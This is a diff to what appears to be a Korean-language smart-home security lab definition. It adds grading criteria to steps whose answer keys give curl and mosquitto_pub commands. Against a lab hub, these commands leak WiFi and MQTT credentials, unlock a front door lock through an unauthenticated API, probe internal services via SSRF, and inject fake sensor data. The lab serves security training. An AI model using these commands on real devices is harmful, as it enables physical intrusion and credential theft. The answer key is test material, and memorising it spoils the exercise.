@@ -17,78 +17,174 @@ steps:
   hint: curl http://{{WEB_IP}}:8090/api/devices를 사용하세요.
   category: recon
   points: 10
-  answer: curl -s http://10.20.30.80:8090/api/devices 2>/dev/null | python3 -m json.tool
-    2>/dev/null | head -15; echo '디바이스 목록 수집 완료'
+  answer: curl -s http://10.20.30.80:8090/api/devices 2>/dev/null | python3 -m json.tool 2>/dev/null |
+    head -15; echo '디바이스 목록 수집 완료'
   answer_detail: 미인증 API에서 전체 디바이스 목록과 상태 정보를 수집할 수 있습니다.
   verify:
     type: output_contains
     expect: 디바이스 목록 수집 완료
     field: stdout
+    semantic:
+      intent: 스마트홈 API 디바이스 목록 — curl -s http://10.20.30.80:8090/api/devices | python3 -m json.tool. 미인증
+        API → 전체 디바이스 + 상태 조회. OWASP API Security Top 10 API2 Broken Auth.
+      success_criteria:
+      - 디바이스 목록 수집 완료 키워드
+      - curl /api/devices + json.tool
+      - 미인증 조회 성공
+      acceptable_methods:
+      - curl + python json.tool
+      - httpx + jq
+      - Postman Collection
+      - Burp Repeater + JSON 뷰어
+      negative_signs:
+      - /api/devices 경로 없음
+      - JSON 파싱 없음
+      - API2 Broken Auth 맥락 없음
   target_vm: attacker
 - order: 2
   instruction: 허브 설정 정보(/api/config)에서 민감 데이터를 추출하시오.
   hint: WiFi 비밀번호, MQTT 인증 정보, API 키를 확인하세요.
   category: data_leak
   points: 12
-  answer: curl -s http://10.20.30.80:8090/api/config 2>/dev/null | python3 -m json.tool
-    2>/dev/null | head -20; echo '설정 정보 수집 완료'
+  answer: curl -s http://10.20.30.80:8090/api/config 2>/dev/null | python3 -m json.tool 2>/dev/null |
+    head -20; echo '설정 정보 수집 완료'
   answer_detail: 설정 API에서 WiFi 비밀번호, MQTT 인증 정보, 클라우드 API 키 등이 노출됩니다.
   verify:
     type: output_contains
     expect: 설정 정보 수집 완료
     field: stdout
+    semantic:
+      intent: 허브 설정 유출 — curl -s http://10.20.30.80:8090/api/config | python3 -m json.tool. WiFi 비밀번호
+        + MQTT 인증 + 클라우드 API 키 노출. OWASP API3 Excessive Data Exposure. CWE-200.
+      success_criteria:
+      - 설정 정보 수집 완료 키워드
+      - curl /api/config + json
+      - 민감 데이터 노출
+      acceptable_methods:
+      - curl + json.tool
+      - gf (grep framework) secrets
+      - trufflehog API 응답 스캔
+      - Nuclei exposure-templates
+      negative_signs:
+      - /api/config 없음
+      - WiFi/MQTT/API 키 맥락 없음
+      - CWE-200 맥락 없음
   target_vm: attacker
 - order: 3
   instruction: API를 통해 현관 도어락(lock_front)을 해제하시오.
   hint: POST /api/devices/lock_front/control에 action:unlock을 전송하세요.
   category: attack
   points: 12
-  answer: "curl -s \\\n     -X POST http://10.20.30.80:8090/api/devices/lock_front/control\
-    \ \\\n     -H 'Content-Type:application/json' \\\n     -d '{\"action\":\"unlock\"\
-    }' 2>/dev/null; echo 'API 도어락 해제 완료'"
+  answer: "curl -s \\\n     -X POST http://10.20.30.80:8090/api/devices/lock_front/control \\\n     -H\
+    \ 'Content-Type:application/json' \\\n     -d '{\"action\":\"unlock\"}' 2>/dev/null; echo 'API 도어락\
+    \ 해제 완료'"
   answer_detail: 인증 없는 API로 도어락을 해제할 수 있으면 물리적 보안 위협이 됩니다.
   verify:
     type: output_contains
     expect: API 도어락 해제 완료
     field: stdout
+    semantic:
+      intent: API 도어락 해제 — curl -X POST /api/devices/lock_front/control -H 'Content-Type:application/json'
+        -d '{"action":"unlock"}'. 미인증 제어 → 물리적 보안 돌파. OWASP API5 Broken Function Level Authorization.
+      success_criteria:
+      - API 도어락 해제 완료 키워드
+      - POST /api/devices/lock_front/control
+      - action:unlock JSON
+      acceptable_methods:
+      - curl + POST JSON
+      - httpie http POST url action=unlock
+      - Postman + Save
+      - Python requests.post
+      negative_signs:
+      - POST 메서드 없음
+      - unlock 액션 맥락 없음
+      - 물리 보안 위협 맥락 없음
   target_vm: attacker
 - order: 4
   instruction: SSRF 취약점을 이용하여 내부 서비스를 스캔하시오.
   hint: /api/webhook/test?url=http://내부IP 형식을 사용하세요.
   category: attack
   points: 10
-  answer: curl -s "http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/"
-    2>/dev/null | head -5; echo 'SSRF 테스트 완료'
+  answer: curl -s "http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/" 2>/dev/null |
+    head -5; echo 'SSRF 테스트 완료'
   answer_detail: SSRF(Server-Side Request Forgery)로 허브에서 내부 서비스에 접근할 수 있습니다.
   verify:
     type: output_contains
     expect: SSRF 테스트 완료
     field: stdout
+    semantic:
+      intent: SSRF — curl -s 'http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/'. 허브가
+        임의 URL 요청 → 내부 서비스 스캔 + 메타데이터 (AWS IMDS) 탈취 가능. OWASP A10:2021 SSRF. CWE-918.
+      success_criteria:
+      - SSRF 테스트 완료 키워드
+      - /api/webhook/test?url=http://127.0.0.1
+      - 내부 URL 요청 유도
+      acceptable_methods:
+      - curl + url= 파라미터
+      - Burp Collaborator DNS out-of-band
+      - SSRFmap 자동
+      - gopher:// LFI → RCE 체이닝
+      negative_signs:
+      - 127.0.0.1 내부 URL 없음
+      - CWE-918 맥락 없음
+      - 내부 스캔 목적 맥락 없음
   target_vm: attacker
 - order: 5
   instruction: MQTT를 통해 스마트홈 디바이스에 가짜 데이터를 주입하시오.
   hint: mosquitto_pub으로 센서 토픽에 메시지를 발행하세요.
   category: mqtt
   points: 10
-  answer: mosquitto_pub -h 10.20.30.80 -t 'homeassistant/sensor/temperature/state'
-    -m '{"value":-30,"unit":"C"}' 2>/dev/null && echo 'MQTT 데이터 주입 완료'
+  answer: mosquitto_pub -h 10.20.30.80 -t 'homeassistant/sensor/temperature/state' -m '{"value":-30,"unit":"C"}'
+    2>/dev/null && echo 'MQTT 데이터 주입 완료'
   answer_detail: MQTT 미인증 접근으로 센서 데이터를 조작하면 자동화 규칙이 오동작할 수 있습니다.
   verify:
     type: output_contains
     expect: MQTT 데이터 주입 완료
     field: stdout
+    semantic:
+      intent: MQTT 가짜 센서 데이터 주입 — mosquitto_pub -h 10.20.30.80 -t 'homeassistant/sensor/temperature/state'
+        -m '{"value":-30,"unit":"C"}'. 조작된 센서 값 → 자동화 규칙 오동작 (냉난방 폭주 등). Home Assistant 토픽 패턴.
+      success_criteria:
+      - MQTT 데이터 주입 완료 키워드
+      - mosquitto_pub + homeassistant/sensor
+      - 비정상 값 (-30) 주입
+      acceptable_methods:
+      - mosquitto_pub -h + -t -m
+      - paho-mqtt publish
+      - Node-RED inject node
+      - MQTT Explorer publish
+      negative_signs:
+      - homeassistant 토픽 없음
+      - 비정상 값 없음
+      - 자동화 오동작 맥락 없음
   target_vm: attacker
 - order: 6
   instruction: 스마트홈 보안 아키텍처를 설계하시오. VLAN 분리, API 인증, 암호화를 포함하시오.
   hint: 네트워크, 인증, 암호화 각 계층의 대책을 정리하세요.
   category: verification
   points: 10
-  answer: echo '=== 스마트홈 보안 아키텍처 ===' && echo '[네트워크] IoT 전용 VLAN + 방화벽' && echo '[인증]
-    API JWT 토큰 + RBAC' && echo '[암호화] MQTT TLS + HTTPS' && echo '[모니터링] 이상 행위 탐지'
-    && echo '[물리] 허브 잠금 보관' && echo '=== 아키텍처 설계 완료 ==='
+  answer: echo '=== 스마트홈 보안 아키텍처 ===' && echo '[네트워크] IoT 전용 VLAN + 방화벽' && echo '[인증] API JWT 토큰 + RBAC'
+    && echo '[암호화] MQTT TLS + HTTPS' && echo '[모니터링] 이상 행위 탐지' && echo '[물리] 허브 잠금 보관' && echo '=== 아키텍처
+    설계 완료 ==='
   answer_detail: 스마트홈 보안은 다층 방어(Defense in Depth) 전략을 적용해야 합니다.
   verify:
     type: output_contains
     expect: 아키텍처 설계 완료
     field: stdout
+    semantic:
+      intent: 스마트홈 보안 아키텍처 — [네트워크] IoT VLAN + 방화벽 + [인증] API JWT + RBAC + [암호화] MQTT TLS + HTTPS + [모니터링]
+        이상 탐지 + [물리] 허브 잠금. Defense in Depth 다층 방어.
+      success_criteria:
+      - 아키텍처 설계 완료 키워드
+      - 네트워크/인증/암호화/모니터링/물리 5계층
+      - Defense in Depth 맥락
+      acceptable_methods:
+      - echo 5계층 아키텍처
+      - Zero Trust IoT 참조 모델
+      - NIST IR 8259 (IoT Device Cybersecurity Capability Core Baseline)
+      - ENISA Good Practices IoT
+      negative_signs:
+      - 계층 3개 이하
+      - 다층 방어 맥락 없음
+      - VLAN/JWT/TLS 중 누락
   target_vm: attacker
